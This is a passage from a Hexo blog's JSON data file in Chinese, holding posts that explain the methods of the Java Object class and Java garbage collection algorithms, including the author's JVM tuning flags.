href=\"#notifyAll\" class=\"headerlink\" title=\"notifyAll()\"></a>notifyAll()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">native</span> <span class=\"keyword\">void</span> <span class=\"title\">notifyAll</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure>\n<p>该方法唤醒所有等待在<code>Object&#39;s monitor</code>的线程。具体的<code>notify</code>和<code>notifyAll</code>参考其他文章。</p>\n<h2 id=\"wait\"><a href=\"#wait\" class=\"headerlink\" title=\"wait()\"></a>wait()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">native</span> <span class=\"keyword\">void</span> <span class=\"title\">wait</span><span class=\"params\">(<span class=\"keyword\">long</span> timeout)</span> <span class=\"keyword\">throws</span> InterruptedException</span>;</span><br></pre></td></tr></table></figure>\n<p>让当前线程等待直到其他线程调用<code>notify()</code>并选择当前对象或者<code>notifyAll()</code>又或者指定等待时间过去。此外，一个线程在等待过程中被中断，会抛出中断异常。</p>\n<h2 id=\"finalize\"><a href=\"#finalize\" class=\"headerlink\" title=\"finalize()\"></a>finalize()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">finalize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Throwable </span>&#123; &#125;</span><br></pre></td></tr></table></figure>\n<p>在垃圾回收时确定没有引用在这个对象上时会调用这个方法。子类重写该方法决定如何去清理这个对象。</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://blog.csdn.net/benjaminlee1/article/details/72843713\" target=\"_blank\" rel=\"external\">Java-Object类源码解析</a></li>\n<li><a href=\"https://blog.csdn.net/youjianbo_han_87/article/details/2586375\" target=\"_blank\" rel=\"external\">java native关键字</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/29511703\" target=\"_blank\" rel=\"external\">java object类详解</a></li>\n</ul>\n","excerpt":"<h2 id=\"Obejct简介\"><a href=\"#Obejct简介\" class=\"headerlink\" title=\"Obejct简介\"></a>Obejct简介</h2><p>Object类是Java中所有类的基类，在编译时会自动导入，位于java.lang包中，而Object中具有的属性和行为，是Java语言设计背后的思维体现。Object类中的大部分方法都是native方法，用此关键字修饰的方法是Java中的本地方法，一般是用C/C++语言来实现。</p>\n<h2 id=\"native-关键字\"><a href=\"#native-关键字\" class=\"headerlink\" title=\"native 关键字\"></a>native 关键字</h2><p>native是与C++联合开发的时候用的！java自己开发不用的！使用native关键字说明这个方法是原生函数，也就是这个方法是用C/C++语言实现的，并且被编译成了DLL，由java去调用。 这些函数的实现体在DLL中，JDK的源代码中并不包含，你应该是看不到的。对于不同的平台它们也是不同的。这也是java的底层机制，实际上java就是在不同的平台上调用不同的native方法实现对操作系统的访问的。native 是用做java 和其他语言（如c++）进行协作时用的 也就是native 后的函数的实现不是用java写的。native的意思就是通知操作系统， 这个函数你必须给我实现，因为我要使用。 所以native关键字的函数都是操作系统实现的， java只能调用。java是跨平台的语言，既然是跨了平台，所付出的代价就是牺牲一些对底层的控制，而java要实现对底层的控制，就需要一些其他语言的帮助，这个就是native的作用了。<br>","more":"</p>\n<h2 id=\"Object-构造函数\"><a href=\"#Object-构造函数\" class=\"headerlink\" title=\"Object 构造函数\"></a>Object 构造函数</h2><p>大部分情况下，Java中通过形如 new A(args..)形式创建一个属于该类型的对象。其中A即是类名，A(args..)即此类定义中相对应的构造函数。通过此种形式创建的对象都是通过类中的构造函数完成。为体现此特性，Java中规定：在类定义过程中，对于未定义构造函数的类，默认会有一个无参数的构造函数，作为所有类的基类，Object类自然要反映出此特性，在源码中，未给出Object类构造函数定义，但实际上，此构造函数是存在的。</p>\n<p>当然，并不是所有的类都是通过此种方式去构建，也自然的，并不是所有的类构造函数都是<strong>public</strong></p>\n<h2 id=\"registerNatives\"><a href=\"#registerNatives\" class=\"headerlink\" title=\"registerNatives()\"></a>registerNatives()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">native</span> <span class=\"keyword\">void</span> <span class=\"title\">registerNatives</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">    registerNatives();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该方法主要作用是将C/C++中的方法映射到Java中的native方法，实现方法命名的解耦。registerNatives的修饰为private，因此该方法只在Object中使用，而接下来的static代码块在类加载的时候加载调用registerNatives方法。可以理解为这是Java在为使用底层做准备。</p>\n<h2 id=\"getClass\"><a href=\"#getClass\" class=\"headerlink\" title=\"getClass()\"></a>getClass()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">native</span> Class&lt;?&gt; getClass();</span><br></pre></td></tr></table></figure>\n<p>该方法返回该对象的Class，同时可以直接通过<code>Object.class</code>来返回相同结果。例如：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.fenlan.base;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(Test.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>该结果返回<code>class com.fenlan.base.Test</code>，这是这个对象运行时class</p>\n<h2 id=\"hashCode\"><a href=\"#hashCode\" class=\"headerlink\" title=\"hashCode()\"></a>hashCode()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">native</span> <span class=\"keyword\">int</span> <span class=\"title\">hashCode</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure>\n<p>该方法返回对象的hash整型码值，关于hashCode()方法的介绍，在<a href=\"http://fenlan.github.io/2018/03/01/Java%E5%B0%8F%E8%AE%B0/\">这里有深入说明</a>，为对象设置hash值是为了支持hash tables 诸如HashMap、HashSet。hashCode()和equals()方法是经常被重写的方法，具体的重写准则如下:</p>\n<ul>\n<li>在Java应用程序程序执行期间，对于同一对象多次调用hashCode()方法时，其返回的哈希码是相同的，前提是将对象进行equals比较时所用的标尺信息未做修改。在Java应用程序的一次执行到另外一次执行，同一对象的hashCode()返回的哈希码无须保持一致；</li>\n<li>如果两个对象相等（依据：调用equals()方法），那么这两个对象调用hashCode()返回的哈希码也必须相等；</li>\n<li>反之，两个对象调用hasCode()返回的哈希码相等，这两个对象不一定相等。程序员应该意识到，为不相等的对象生成不同的整数结果可能会提高散列表的性能。</li>\n</ul>\n<h2 id=\"equals\"><a href=\"#equals\" class=\"headerlink\" title=\"equals()\"></a>equals()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">equals</span><span class=\"params\">(Object obj)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"keyword\">this</span> == obj);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>==</code>与<code>equals</code>在Java中经常被使用，大家也都知道==与equals的区别：==表示的是变量值完成相同(对于基础类型，地址中存储的是值，引用类型则存储指向实际对象的地址)；equals表示的是对象的内容完全相同，此处的内容多指对象的特征/属性。</p>\n<p>那么问题来了，Object里面调用了<code>==</code>那为什么还需要<code>equals</code>，equlas()方法的正确理解应该是：判断两个对象是否相等。那么判断对象相等的标尺又是什么？Object判断相等是两个引用具有相同对象地址，但其他情况下我们不需要这么严格的要求，诸如两个类只要某些属性相同就可以认为是相等的，那么就需要重写<code>equals</code>。</p>\n<h2 id=\"clone\"><a href=\"#clone\" class=\"headerlink\" title=\"clone()\"></a>clone()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">native</span> Object <span class=\"title\">clone</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> CloneNotSupportedException</span>;</span><br></pre></td></tr></table></figure>\n<p>克隆方法是返回一个当前对象的拷贝，而这里的拷贝精确定义需要依赖这个对象的类定义。</p>\n<h2 id=\"toString-NaN\"><a href=\"#toString-NaN\" class=\"headerlink\" title=\"toString()\"></a>toString()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> getClass().getName() + <span class=\"string\">\"@\"</span> + Integer.toHexString(hashCode());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>返回一个表示当前对象的字符串，通过这个这个字符串可以简单的表示一些对象信息，为了更多的展示对象信息，可以选择重写该方法。默认情况下返回当前对象的类名和十六进制的hashCode。</p>\n<h2 id=\"notify\"><a href=\"#notify\" class=\"headerlink\" title=\"notify()\"></a>notify()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">native</span> <span class=\"keyword\">void</span> <span class=\"title\">notify</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure>\n<p>该方法唤醒一个等待在<code>this object&#39;s monitor</code>的单线程。如果有多个线程等待这个对象，那么唤醒其中一个。而<code>Object&#39;s monitor</code>中的线程是之前调用了<code>wait</code>方法。此外其他的说明参考源码注释。</p>\n<blockquote>\n<p>Wakes up a single thread that is waiting on this object’s monitor. If any threads are waiting on this object, one of them is chosen to be awakened. The choice is arbitrary and occurs atthe discretion of the implementation. A thread waits on an object’s monitor by calling one of the {@code wait} methods.</p>\n<p>This method should only be called by a thread that is the owner of this object’s monitor. A thread becomes the owner of the object’s monitor in one of three ways:</p>\n<ol>\n<li>By executing a synchronized instance method of that object.</li>\n<li>By executing the body of a {@code synchronized} statement that synchronizes on the object.</li>\n<li>For objects of type {@code Class,} by executing a synchronized static method of that class.</li>\n</ol>\n<p>Only one thread at a time can own an object’s monitor.</p>\n</blockquote>\n<h2 id=\"notifyAll\"><a href=\"#notifyAll\" class=\"headerlink\" title=\"notifyAll()\"></a>notifyAll()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">native</span> <span class=\"keyword\">void</span> <span class=\"title\">notifyAll</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure>\n<p>该方法唤醒所有等待在<code>Object&#39;s monitor</code>的线程。具体的<code>notify</code>和<code>notifyAll</code>参考其他文章。</p>\n<h2 id=\"wait\"><a href=\"#wait\" class=\"headerlink\" title=\"wait()\"></a>wait()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">native</span> <span class=\"keyword\">void</span> <span class=\"title\">wait</span><span class=\"params\">(<span class=\"keyword\">long</span> timeout)</span> <span class=\"keyword\">throws</span> InterruptedException</span>;</span><br></pre></td></tr></table></figure>\n<p>让当前线程等待直到其他线程调用<code>notify()</code>并选择当前对象或者<code>notifyAll()</code>又或者指定等待时间过去。此外，一个线程在等待过程中被中断，会抛出中断异常。</p>\n<h2 id=\"finalize\"><a href=\"#finalize\" class=\"headerlink\" title=\"finalize()\"></a>finalize()</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">finalize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Throwable </span>&#123; &#125;</span><br></pre></td></tr></table></figure>\n<p>在垃圾回收时确定没有引用在这个对象上时会调用这个方法。子类重写该方法决定如何去清理这个对象。</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://blog.csdn.net/benjaminlee1/article/details/72843713\">Java-Object类源码解析</a></li>\n<li><a href=\"https://blog.csdn.net/youjianbo_han_87/article/details/2586375\">java native关键字</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/29511703\">java object类详解</a></li>\n</ul>"},{"title":"Java GC","date":"2018-04-11T07:18:23.000Z","_content":"\n## Java堆空间划分\n![](/images/r_heap1.PNG)\n\n![](http://dl2.iteye.com/upload/attachment/0088/6262/6af6a224-8b2d-3f23-8b58-79263cfda9c4.png)\n\n<!--more-->\n\n## 引用计数法(Reference Counting)\n引用计数法是最经典也是最古老的一种垃圾收集方法，它的实现很简单，只要为每个对象设置一个整型的计数器即可。但是引用计数法有两个严重的问题：\n- 无法处理循环引用的情况。因此在Java的垃圾回收器中，没有使用这种算法。\n- 引用计数器要求在每次因引用产生和消除的时候，需要伴随一个加法操作和减法操作，对系统性能会有一定的影响。\n\n> 一个简单的循环引用问题描述如下：有对象A和对象B，对象A中含有对象B的引用，对象B中含有对象A的引用。此时，对象A和对象B的计数器都不为0。但是在系统中，却不存在任何第3飞蛾对象引用了A或B。也就是说，A和B是应该被回收的垃圾对象，但是由于垃圾对象间相互引用，从而使垃圾回收器无法识别，引起内存泄漏。\n\n## 标记清除法(Mark-Sweep)\n![](http://image.codes51.com/Article/image/20160321/20160321124229_9001.png)\n标记清除算法是现代垃圾回收算法的思想基础。标记清除算法将垃圾回收分为两个阶段：标记阶段、清除阶段。一种可行的实现是，在标记阶段，首先通过跟节点标记所有从跟节点开始的可达对象。因此，未标记的对象就是未被利用的垃圾对象。然后在清除阶段，清除所有未被标记的对象。**标记清除算法可能会产生最大问题是空间碎片。**\n\n## 复制算法(Copying)\n![](https://weiwei02.coding.me/images/java/jvm/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%A4%8D%E5%88%B6.png)\n复制算法的核心思想是：将原有的内存空间分为两块，每次只使用其中一块，在垃圾回收时，将正在使用的内存中的存活对象复制到未使用的内存块中，之后清除正在使用的内存块中的所有对象，交换两个内存的角色，完成垃圾回收。\n\n如果系统中的垃圾对象很多，复制算法需要赋值的存活对象数量就会相对较少。因此，在真正需要垃圾回收的时刻，复制算法的效率是很高的。又由于对象是在垃圾回收过程中，统一被复制到新的内存空间中的，因此可确保回收后的内存空间是没有碎片的。虽然有以上两大优点，但是复制算法的代价却是将系统内存折半，因此单纯的复制算法也很难让人接收。现代Java回收机制中新生代的Survivor区域在使用这样的回收算法，因为新生代垃圾对象比存活对象多，复制算法高效。新生代Survivor区是两个比较小，但大小相等的内存块，在我的调优参数设置中，Survivor区通常只占用新生代区域的1/8，但也不是固定的，多尝试比例可以有较好的收获。\n> 题外话，我的一个项目上线初期，默认的JVM参数，CPU占用一直高居25%，但是调整后一直保持在20%以下，但同时内存占用却上升了。至于如何调整的，我还需要再深入一下。\n\n> 记录一下详细的配置过程 : 第一次上线，所有的配置都是默认的，记录Java堆各个代的情况，根据情况进行调整；第二次上线，采取减少堆的大小: `-Xmx250m -Xms40m -Xmn15m -XX:SurvivorRatio=10` 效果显著，在原来CPU高居25%-30%的情况下，顺利降到20%以下；第三次上线，采取增大堆的大小： `-Xmx250m -Xms75m -Xmn25m -XX:SurvivorRatio=10`，效果更好，已经降到16%以下。\n\n![](/images/nginxlog.png)\n\n`在这里补充一下Java垃圾回收的大致过程`：\n在垃圾回收时，eden空间中的存活对象会被复制到未使用的survivor空间中(假设死to)，正在使用的suvivor空间(假设是from)中的年轻对象也会被赋值到to空间中(大对象，或者老年对象会直接进入老年代，如果to空间已满，则对象也会直接进入老年代)。此时eden空间和from空间中的剩余对象就是垃圾对象，可以直接清空，to空间则存放此次回收后的存活对象。这种改进的复制算法，既保证了空间的连续性，又避免了大量的内存空间浪费。\n\n## 标记压缩(Mark-Compact)\n![](http://image.codes51.com/Article/image/20160321/20160321124230_0720.png)\n复制算法的高效性是建立在存活对象少，垃圾对象多的前提下的，这种情况在新生代经常发生，但是在老年代，更常见的情况是大部分对象都是存活对象。如果依然使用复制算法，复制成本也将很高。因此基于老年代垃圾回收的特性，需要使用其他的算法。\n\n标记压缩算法是一种老年代的回收算法。它在标记清除算法的基础上做了一些优化。和标记算法一样，标记压缩算法也首先需要从跟节点开始，对所有可达对象做标记。但之后，它不是简单地清理未标记的对象，而是将所有的存活对象压缩到内存的一端。之后清理边界外所有的空间。这种方法避免了碎片的产生，又不需要两块相同的内存空间，因此其性价比比较高。\n\n## 分代算法(Generational Collecting)\n\n上述介绍的算法中，并没有一种算法可以完全替代其他算法，它们都具有自己独特的优势和特点。因此根据垃圾回收对象的特性，使用合适的算法回收，才是明智的选择。\n分代算法就是基于这种思想，他将内存区间根据对象特点分成几块，根据每块内存空间的特点，使用不同的回收算法，以提高垃圾回收的效率。\n\n一般来说Java虚拟机会将所有的新建对象都放入成为新生代的内存区域，新生代的特点死对象朝生夕灭，大约90%的新建对象会被很快回收，因此，新生代比较适合使用复制算法。当一个对象经过几次回收后依然存活，对象就会被放入成为老年代的内存空间。在老年代中，几乎所有的对象都是经过几次垃圾回收后依然得以存活的。因此，可以认为这些对象在一段时间期内，甚至在应用程序的整个生命周期中，将是常驻内存的。那么这些对象回收就应该采用`标记压缩`或`标记清除`算法，以提高垃圾回收效率。\n\n对于新生代和老年代来说，通常新生代回收频率很高，但是每次回收的耗时都很短，而老年代回收频率比较低，但是会消耗更多的时间。**同时这引来一个问题，当老年代中的对象持有新生代对象的引用时怎么办？**为了解决这个问题，虚拟机可能使用一种叫做卡表(Card Table)的数据结构。卡表为一个比特位集合，每一个比特位可以用来表示老年代的某一区域中的所有对象是否持有新生代对象的引用。这样在新生代GC时，可以不用花大量的时间扫描所有老年代对象，来确定每一个对象的引用关系，而可以先扫描卡表，当卡表的标记为1时才扫描给定区域的老年代对象；而当卡表位为0时就不用是扫描所在区域的老年代对象。\n\n## 分区算法(Region)\n分代算法是按照对象的生命周期长短划分成两部分，分区算法将真个给堆空间划分为连续的不同小区间，每个区间都独立使用，独立回收。这种算法的好处是可以控制一次回收多少个小区间。\n\n一般来说，在相同条件下，堆空间越大，一次GC时所需要的时间就越长，从而产生的停顿也越长。为了更好地控制GC产生的停顿时间，将一块大的内存区域分割成多个小块，根据目标停顿时间，每次合理地回收若干个小区间，而不是整个堆空间，从而减少一次GC所产生的停顿。\n\n## 参考链接\n- [Java垃圾回收算法](https://blog.csdn.net/u010429311/article/details/52724075)\n- [JVM虚拟机-垃圾回收算法](https://weiwei02.github.io/2017/08/18/jvm/gc%E7%AE%97%E6%B3%95/)\n- 实战Java虚拟机(图书)","source":"_posts/Java GC.md","raw":"---\ntitle: Java GC\ndate: 2018-04-11 15:18:23\ncategories: Java\ntags:\n  - Java\n  - GC\n  - JMM\n---\n\n## Java堆空间划分\n![](/images/r_heap1.PNG)\n\n![](http://dl2.iteye.com/upload/attachment/0088/6262/6af6a224-8b2d-3f23-8b58-79263cfda9c4.png)\n\n<!--more-->\n\n## 引用计数法(Reference Counting)\n引用计数法是最经典也是最古老的一种垃圾收集方法，它的实现很简单，只要为每个对象设置一个整型的计数器即可。但是引用计数法有两个严重的问题：\n- 无法处理循环引用的情况。因此在Java的垃圾回收器中，没有使用这种算法。\n- 引用计数器要求在每次因引用产生和消除的时候，需要伴随一个加法操作和减法操作，对系统性能会有一定的影响。\n\n> 一个简单的循环引用问题描述如下：有对象A和对象B，对象A中含有对象B的引用，对象B中含有对象A的引用。此时，对象A和对象B的计数器都不为0。但是在系统中，却不存在任何第3飞蛾对象引用了A或B。也就是说，A和B是应该被回收的垃圾对象，但是由于垃圾对象间相互引用，从而使垃圾回收器无法识别，引起内存泄漏。\n\n## 标记清除法(Mark-Sweep)\n![](http://image.codes51.com/Article/image/20160321/20160321124229_9001.png)\n标记清除算法是现代垃圾回收算法的思想基础。标记清除算法将垃圾回收分为两个阶段：标记阶段、清除阶段。一种可行的实现是，在标记阶段，首先通过跟节点标记所有从跟节点开始的可达对象。因此，未标记的对象就是未被利用的垃圾对象。然后在清除阶段，清除所有未被标记的对象。**标记清除算法可能会产生最大问题是空间碎片。**\n\n## 复制算法(Copying)\n![](https://weiwei02.coding.me/images/java/jvm/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%A4%8D%E5%88%B6.png)\n复制算法的核心思想是：将原有的内存空间分为两块，每次只使用其中一块，在垃圾回收时，将正在使用的内存中的存活对象复制到未使用的内存块中，之后清除正在使用的内存块中的所有对象，交换两个内存的角色，完成垃圾回收。\n\n如果系统中的垃圾对象很多，复制算法需要赋值的存活对象数量就会相对较少。因此，在真正需要垃圾回收的时刻，复制算法的效率是很高的。又由于对象是在垃圾回收过程中，统一被复制到新的内存空间中的，因此可确保回收后的内存空间是没有碎片的。虽然有以上两大优点，但是复制算法的代价却是将系统内存折半，因此单纯的复制算法也很难让人接收。现代Java回收机制中新生代的Survivor区域在使用这样的回收算法，因为新生代垃圾对象比存活对象多，复制算法高效。新生代Survivor区是两个比较小，但大小相等的内存块，在我的调优参数设置中，Survivor区通常只占用新生代区域的1/8，但也不是固定的，多尝试比例可以有较好的收获。\n> 题外话，我的一个项目上线初期，默认的JVM参数，CPU占用一直高居25%，但是调整后一直保持在20%以下，但同时内存占用却上升了。至于如何调整的，我还需要再深入一下。\n\n> 记录一下详细的配置过程 : 第一次上线，所有的配置都是默认的，记录Java堆各个代的情况，根据情况进行调整；第二次上线，采取减少堆的大小: `-Xmx250m -Xms40m -Xmn15m -XX:SurvivorRatio=10` 效果显著，在原来CPU高居25%-30%的情况下，顺利降到20%以下；第三次上线，采取增大堆的大小： `-Xmx250m -Xms75m -Xmn25m -XX:SurvivorRatio=10`，效果更好，已经降到16%以下。\n\n![](/images/nginxlog.png)\n\n`在这里补充一下Java垃圾回收的大致过程`：\n在垃圾回收时，eden空间中的存活对象会被复制到未使用的survivor空间中(假设死to)，正在使用的suvivor空间(假设是from)中的年轻对象也会被赋值到to空间中(大对象，或者老年对象会直接进入老年代，如果to空间已满，则对象也会直接进入老年代)。此时eden空间和from空间中的剩余对象就是垃圾对象，可以直接清空，to空间则存放此次回收后的存活对象。这种改进的复制算法，既保证了空间的连续性，又避免了大量的内存空间浪费。\n\n## 标记压缩(Mark-Compact)\n![](http://image.codes51.com/Article/image/20160321/20160321124230_0720.png)\n复制算法的高效性是建立在存活对象少，垃圾对象多的前提下的，这种情况在新生代经常发生，但是在老年代，更常见的情况是大部分对象都是存活对象。如果依然使用复制算法，复制成本也将很高。因此基于老年代垃圾回收的特性，需要使用其他的算法。\n\n标记压缩算法是一种老年代的回收算法。它在标记清除算法的基础上做了一些优化。和标记算法一样，标记压缩算法也首先需要从跟节点开始，对所有可达对象做标记。但之后，它不是简单地清理未标记的对象，而是将所有的存活对象压缩到内存的一端。之后清理边界外所有的空间。这种方法避免了碎片的产生，又不需要两块相同的内存空间，因此其性价比比较高。\n\n## 分代算法(Generational Collecting)\n\n上述介绍的算法中，并没有一种算法可以完全替代其他算法，它们都具有自己独特的优势和特点。因此根据垃圾回收对象的特性，使用合适的算法回收，才是明智的选择。\n分代算法就是基于这种思想，他将内存区间根据对象特点分成几块，根据每块内存空间的特点，使用不同的回收算法，以提高垃圾回收的效率。\n\n一般来说Java虚拟机会将所有的新建对象都放入成为新生代的内存区域，新生代的特点死对象朝生夕灭，大约90%的新建对象会被很快回收，因此，新生代比较适合使用复制算法。当一个对象经过几次回收后依然存活，对象就会被放入成为老年代的内存空间。在老年代中，几乎所有的对象都是经过几次垃圾回收后依然得以存活的。因此，可以认为这些对象在一段时间期内，甚至在应用程序的整个生命周期中，将是常驻内存的。那么这些对象回收就应该采用`标记压缩`或`标记清除`算法，以提高垃圾回收效率。\n\n对于新生代和老年代来说，通常新生代回收频率很高，但是每次回收的耗时都很短，而老年代回收频率比较低，但是会消耗更多的时间。**同时这引来一个问题，当老年代中的对象持有新生代对象的引用时怎么办？**为了解决这个问题，虚拟机可能使用一种叫做卡表(Card Table)的数据结构。卡表为一个比特位集合，每一个比特位可以用来表示老年代的某一区域中的所有对象是否持有新生代对象的引用。这样在新生代GC时，可以不用花大量的时间扫描所有老年代对象，来确定每一个对象的引用关系，而可以先扫描卡表，当卡表的标记为1时才扫描给定区域的老年代对象；而当卡表位为0时就不用是扫描所在区域的老年代对象。\n\n## 分区算法(Region)\n分代算法是按照对象的生命周期长短划分成两部分，分区算法将真个给堆空间划分为连续的不同小区间，每个区间都独立使用，独立回收。这种算法的好处是可以控制一次回收多少个小区间。\n\n一般来说，在相同条件下，堆空间越大，一次GC时所需要的时间就越长，从而产生的停顿也越长。为了更好地控制GC产生的停顿时间，将一块大的内存区域分割成多个小块，根据目标停顿时间，每次合理地回收若干个小区间，而不是整个堆空间，从而减少一次GC所产生的停顿。\n\n## 参考链接\n- [Java垃圾回收算法](https://blog.csdn.net/u010429311/article/details/52724075)\n- [JVM虚拟机-垃圾回收算法](https://weiwei02.github.io/2017/08/18/jvm/gc%E7%AE%97%E6%B3%95/)\n- 实战Java虚拟机(图书)","slug":"Java GC","published":1,"updated":"2018-04-16T07:07:58.144Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscx3000byp0lsj5xwz9r","content":"<h2 id=\"Java堆空间划分\"><a href=\"#Java堆空间划分\" class=\"headerlink\" title=\"Java堆空间划分\"></a>Java堆空间划分</h2><p><img src=\"/images/r_heap1.PNG\" alt=\"\"></p>\n<p><img src=\"http://dl2.iteye.com/upload/attachment/0088/6262/6af6a224-8b2d-3f23-8b58-79263cfda9c4.png\" alt=\"\"></p>\n<a id=\"more\"></a>\n<h2 id=\"引用计数法-Reference-Counting\"><a href=\"#引用计数法-Reference-Counting\" class=\"headerlink\" title=\"引用计数法(Reference Counting)\"></a>引用计数法(Reference Counting)</h2><p>引用计数法是最经典也是最古老的一种垃圾收集方法，它的实现很简单，只要为每个对象设置一个整型的计数器即可。但是引用计数法有两个严重的问题：</p>\n<ul>\n<li>无法处理循环引用的情况。因此在Java的垃圾回收器中，没有使用这种算法。</li>\n<li>引用计数器要求在每次因引用产生和消除的时候，需要伴随一个加法操作和减法操作，对系统性能会有一定的影响。</li>\n</ul>\n<blockquote>\n<p>一个简单的循环引用问题描述如下：有对象A和对象B，对象A中含有对象B的引用，对象B中含有对象A的引用。此时，对象A和对象B的计数器都不为0。但是在系统中，却不存在任何第3飞蛾对象引用了A或B。也就是说，A和B是应该被回收的垃圾对象，但是由于垃圾对象间相互引用，从而使垃圾回收器无法识别，引起内存泄漏。</p>\n</blockquote>\n<h2 id=\"标记清除法-Mark-Sweep\"><a href=\"#标记清除法-Mark-Sweep\" class=\"headerlink\" title=\"标记清除法(Mark-Sweep)\"></a>标记清除法(Mark-Sweep)</h2><p><img src=\"http://image.codes51.com/Article/image/20160321/20160321124229_9001.png\" alt=\"\"><br>标记清除算法是现代垃圾回收算法的思想基础。标记清除算法将垃圾回收分为两个阶段：标记阶段、清除阶段。一种可行的实现是，在标记阶段，首先通过跟节点标记所有从跟节点开始的可达对象。因此，未标记的对象就是未被利用的垃圾对象。然后在清除阶段，清除所有未被标记的对象。<strong>标记清除算法可能会产生最大问题是空间碎片。</strong></p>\n<h2 id=\"复制算法-Copying\"><a href=\"#复制算法-Copying\" class=\"headerlink\" title=\"复制算法(Copying)\"></a>复制算法(Copying)</h2><p><img src=\"https://weiwei02.coding.me/images/java/jvm/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%A4%8D%E5%88%B6.png\" 